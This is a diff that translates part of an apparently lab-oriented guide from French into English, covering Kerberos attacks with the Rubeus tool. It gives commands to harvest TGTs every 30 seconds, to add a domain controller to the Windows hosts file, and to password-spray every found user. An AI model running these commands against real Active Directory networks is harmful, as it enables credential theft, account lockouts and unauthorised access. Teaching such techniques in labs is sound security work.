@@ -1,8 +1,8 @@
 ## Harvesting
 
-La récolte rassemble les tickets qui sont transférés vers le KDC et les enregistre pour les utiliser dans d'autres attaques telles que l'attaque par passe le ticket.
+Harvesting gathers tickets that are transferred to the KDC and saves them for use in other attacks such as the pass the ticket attack.
 
-Cette commande indique à Rubeus de récolter des TGT toutes les 30 secondes
+This command tells Rubeus to harvest TGTs every 30 seconds
 
 ```sh
 C:\Users\Administrator> Rubeus.exe harvest /interval:30
@@ -10,7 +10,7 @@ C:\Users\Administrator> Rubeus.exe harvest /interval:30
 
 ## Password Spraying
 
-Avant de pulvériser le mot de passe avec Rubeus, vous devez ajouter le nom de domaine du contrôleur de domaine au fichier hôte Windows.
+Before password spraying with Rubeus, you need to add the domain controller domain name to the Windows hosts file.
 
 ```sh
 C:\Users\Administrator> echo 10.10.x.x CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
@@ -18,6 +18,6 @@ C:\Users\Administrator> echo 10.10.x.x CONTROLLER.local >> C:\Windows\System32\d
 C:\Users\Administrator> Rubeus.exe brute /password:YOUR_PASSWORD /noticket
 ```
 
-Cela prendra `YOUR_PASSWORD` et le "pulvérisera" contre tous les utilisateurs trouvés, puis donnera le `.kirbi` TGT pour cet utilisateur
+This will take `YOUR_PASSWORD` and "spray" it against all found users, then give the `.kirbi` TGT for that user.
 
-> Soyez attentif à la manière dont vous utilisez cette attaque, car elle peut vous bloquer l’accès au réseau en fonction des politiques de verrouillage de compte.
+> Be mindful of how you use this attack, as it can lock you out of network access depending on account lockout policies.
